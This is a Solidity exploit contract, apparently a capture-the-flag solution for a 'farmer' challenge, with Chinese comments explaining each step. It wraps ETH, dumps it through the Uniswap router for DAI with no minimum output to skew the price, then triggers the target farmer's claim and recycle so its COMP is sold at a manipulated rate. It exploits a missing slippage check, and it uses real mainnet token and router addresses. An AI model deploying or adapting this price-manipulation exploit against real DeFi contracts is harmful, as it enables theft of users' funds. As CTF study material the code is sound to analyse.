pragma solidity ^0.8.0;

import "./Setup.sol";

contract farmerExploit {
    ERC20Like public constant dai = ERC20Like(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    UniRouter public constant router = UniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    WETH9 public constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    ERC20Like public constant COMP = ERC20Like(0xc00e94Cb662C3520282E6f5717214004A7f26888);

    CompDaiFarmer public farmer;
    farmerSetup setup;

    constructor(farmerSetup _setup) payable {
        // 将ETH存入WETH，换成WETH
        WETH.deposit{value: msg.value}();
        setup = _setup;
        farmer = setup.farmer();
        WETH.approve(address(farmer), type(uint256).max);
        WETH.approve(address(router), type(uint256).max);

        COMP.approve(address(farmer), type(uint256).max);
        COMP.approve(address(router), type(uint256).max);

        // 将 WETH 通过 uniswap 交换成dai => 从而向下移动 WETH -> DAI 曲线点
        // 事实上交易 Comp -> WETH 对我们来说会更有利可图
        // 但我们没有任何 Comp，所以选择 WETH -> DAI
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(dai);

        uint256 bal = WETH.balanceOf(address(this));

        router.swapExactTokensForTokens(
            bal, //amountIn
            0, //amountOutMin，漏洞点在这里，检查Swap最后得到的Token数量和提供的amountOutMin值的大小关系
            path, //path
            address(this), //to
            block.timestamp //deadline
        );
        //索赔COMP,使 faucet 的comp数量为0
        farmer.claim();
        //将COMP交换得到dai,使 farm 的COMP的数量为0，且dai的数量少于expected
        farmer.recycle();
    }
}
